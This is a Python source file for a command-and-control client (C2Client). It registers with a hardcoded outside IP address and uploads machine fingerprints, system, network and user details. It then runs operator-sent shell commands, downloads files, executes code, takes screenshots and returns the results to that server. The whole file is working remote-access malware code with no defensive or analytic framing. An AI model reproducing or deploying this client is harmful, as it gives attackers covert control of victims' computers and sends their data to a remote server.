import socket
import platform
import uuid
import json
import time
import subprocess
import threading
from datetime import datetime
import requests
import psutil
import logging
from flask_socketio import SocketIO
from flask import Flask
import hashlib

# Client Configuration
SERVER_IP = '193.111.248.212'
SERVER_PORT = 5000
HEARTBEAT_INTERVAL = 60  # seconds
LOG_FILE = 'client.log'

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('C2Client')

class C2Client:
    def __init__(self):
        self.hw_id = self.generate_hw_id()
        self.session_id = str(uuid.uuid4())
        self.connected = False
        self.command_queue = []
        self.app = Flask(__name__)
        self.socketio = SocketIO(self.app)
        self.setup_websocket()

    def generate_hw_id(self) -> str:
        """Generate a unique hardware ID for this client"""
        try:
            # Get MAC address
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
            
            # Get disk serial number (alternative method)
            disk_info = ""
            if platform.system() == 'Windows':
                try:
                    process = subprocess.run(
                        ['wmic', 'diskdrive', 'get', 'serialnumber'], 
                        capture_output=True, 
                        text=True
                    )
                    disk_info = process.stdout.strip()
                except:
                    disk_info = str(uuid.uuid4())
            else:
                disk_info = str(uuid.uuid4())
            
            system_info = {
                'mac': mac,
                'machine': platform.machine(),
                'processor': platform.processor(),
                'disk_id': disk_info
            }
            unique_str = ''.join(system_info.values())
            return hashlib.sha256(unique_str.encode()).hexdigest()
        except Exception as e:
            logger.error(f"Error generating HW ID: {e}")
            return str(uuid.uuid4())

    def get_system_info(self) -> dict:
        """Collect system information"""
        return {
            'os': platform.system(),
            'os_version': platform.version(),
            'hostname': platform.node(),
            'architecture': platform.architecture()[0],
            'cpu_count': psutil.cpu_count(),
            'total_memory': round(psutil.virtual_memory().total / (1024**3), 2),
            'disk_usage': {d.device: {
                'total': psutil.disk_usage(d.mountpoint).total,
                'used': psutil.disk_usage(d.mountpoint).used,
                'free': psutil.disk_usage(d.mountpoint).free,
                'percent': psutil.disk_usage(d.mountpoint).percent
            } for d in psutil.disk_partitions() if d.fstype},
            'network_info': self.get_network_info(),
            'users': [{
                'name': u.name,
                'terminal': u.terminal,
                'host': u.host,
                'started': u.started
            } for u in psutil.users()],
            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat()
        }

    def get_network_info(self) -> dict:
        """Get network interface information"""
        interfaces = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
        network_info = {}
        
        for iface, addrs in interfaces.items():
            addresses = []
            for addr in addrs:
                addresses.append({
                    'family': addr.family.name,
                    'address': addr.address,
                    'netmask': addr.netmask,
                    'broadcast': addr.broadcast
                })
            
            iface_stats = None
            if iface in stats:
                iface_stats = {
                    'isup': stats[iface].isup,
                    'duplex': stats[iface].duplex.name,
                    'speed': stats[iface].speed,
                    'mtu': stats[iface].mtu
                }
            
            network_info[iface] = {
                'addresses': addresses,
                'stats': iface_stats
            }
        
        return network_info

    def connect_to_server(self):
        """Establish connection with C2 server"""
        while True:
            try:
                self.connected = False
                logger.info(f"Attempting to connect to server at {SERVER_IP}:{SERVER_PORT}")
                
                # Register with the server
                registration_data = {
                    'hw_id': self.hw_id,
                    'session_id': self.session_id,
                    'system_info': self.get_system_info(),
                    'timestamp': datetime.now().isoformat()
                }
                
                response = requests.post(
                    f'http://{SERVER_IP}:{SERVER_PORT}/register',
                    json=registration_data,
                    timeout=10
                )
                
                if response.status_code == 200:
                    self.connected = True
                    logger.info("Successfully connected to C2 server")
                    data = response.json()
                    
                    # Process any pending commands
                    if 'pending_commands' in data:
                        for cmd in data['pending_commands']:
                            self.process_command(cmd)
                    
                    # Start heartbeat thread
                    threading.Thread(target=self.send_heartbeat, daemon=True).start()
                    
                    # Start command processing thread
                    threading.Thread(target=self.process_command_queue, daemon=True).start()
                    
                    return
                
                logger.warning(f"Connection failed: {response.text}")
            except Exception as e:
                logger.error(f"Connection error: {str(e)}")
            
            time.sleep(10)  # Wait before reconnecting

    def send_heartbeat(self):
        """Send regular heartbeat to server"""
        while self.connected:
            try:
                requests.post(
                    f'http://{SERVER_IP}:{SERVER_PORT}/heartbeat',
                    json={
                        'hw_id': self.hw_id,
                        'timestamp': datetime.now().isoformat()
                    },
                    timeout=5
                )
            except Exception as e:
                logger.error(f"Heartbeat failed: {str(e)}")
                self.connected = False
                break
            
            time.sleep(HEARTBEAT_INTERVAL)

    def process_command_queue(self):
        """Process commands from the queue"""
        while self.connected:
            if self.command_queue:
                cmd = self.command_queue.pop(0)
                self.process_command(cmd)
            time.sleep(1)

    def process_command(self, command_data: dict):
        """Execute a received command"""
        try:
            command = command_data['command']
            params = command_data.get('parameters', {})
            result = None
            
            logger.info(f"Executing command: {command}")
            
            if command == 'sysinfo':
                result = self.get_system_info()
            elif command == 'shell':
                cmd = params.get('cmd')
                if cmd:
                    result = {
                        'stdout': subprocess.getoutput(cmd),
                        'returncode': 0  # Simplified for demo
                    }
            elif command == 'screenshot':
                result = self.take_screenshot()
            elif command == 'download':
                result = self.download_file(params.get('url'))
            elif command == 'execute':
                result = self.execute_code(params.get('code'))
            else:
                result = {'error': 'Unknown command'}
            
            # Send result back to server
            self.send_command_result(command, result)
            
        except Exception as e:
            logger.error(f"Command execution failed: {str(e)}")
            self.send_command_result(command, {'error': str(e)})

    def send_command_result(self, command: str, result: dict):
        """Send command execution result to server"""
        try:
            requests.post(
                f'http://{SERVER_IP}:{SERVER_PORT}/command_result',
                json={
                    'hw_id': self.hw_id,
                    'command': command,
                    'result': result,
                    'timestamp': datetime.now().isoformat()
                },
                timeout=10
            )
        except Exception as e:
            logger.error(f"Failed to send command result: {str(e)}")

    def setup_websocket(self):
        """Setup websocket connection for real-time commands"""
        @self.socketio.on('connect')
        def handle_connect():
            logger.info("WebSocket connected")

        @self.socketio.on('new_command')
        def handle_new_command(data):
            if data.get('hw_id') == self.hw_id:
                logger.info("Received new command via WebSocket")
                self.command_queue.append(data)

        # Run websocket in separate thread
        threading.Thread(
            target=lambda: self.socketio.run(
                self.app,
                host='127.0.0.1',
                port=5002,
                debug=False,
                use_reloader=False
            ),
            daemon=True
        ).start()

    def take_screenshot(self) -> dict:
        """Take screenshot (platform specific)"""
        try:
            if platform.system() == 'Windows':
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot.save('screenshot.png')
                return {'status': 'success', 'file': 'screenshot.png'}
            else:
                # Linux/Mac alternative
                return {'status': 'error', 'message': 'Screenshot not implemented for this platform'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def download_file(self, url: str) -> dict:
        """Download file from URL"""
        try:
            if not url:
                return {'status': 'error', 'message': 'No URL provided'}
            
            local_filename = url.split('/')[-1]
            with requests.get(url, stream=True) as r:
                r.raise_for_status()
                with open(local_filename, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192): 
                        f.write(chunk)
            return {'status': 'success', 'file': local_filename}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def execute_code(self, code: str) -> dict:
        """Execute provided code (dangerous - use with caution)"""
        try:
            if not code:
                return {'status': 'error', 'message': 'No code provided'}
            
            # Restricted environment for safety
            restricted_globals = {
                '__builtins__': {
                    'print': print,
                    'range': range,
                    'len': len,
                    'str': str,
                    'int': int,
                    'float': float,
                    'list': list,
                    'dict': dict
                }
            }
            
            # Execute in a temporary dictionary to capture output
            local_vars = {}
            exec(code, restricted_globals, local_vars)
            
            return {
                'status': 'success',
                'result': local_vars.get('result', None),
                'output': local_vars
            }
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def run(self):
        """Main client loop"""
        self.connect_to_server()
        while True:
            if not self.connected:
                self.connect_to_server()
            time.sleep(5)

if __name__ == '__main__':
    client = C2Client()
    client.run()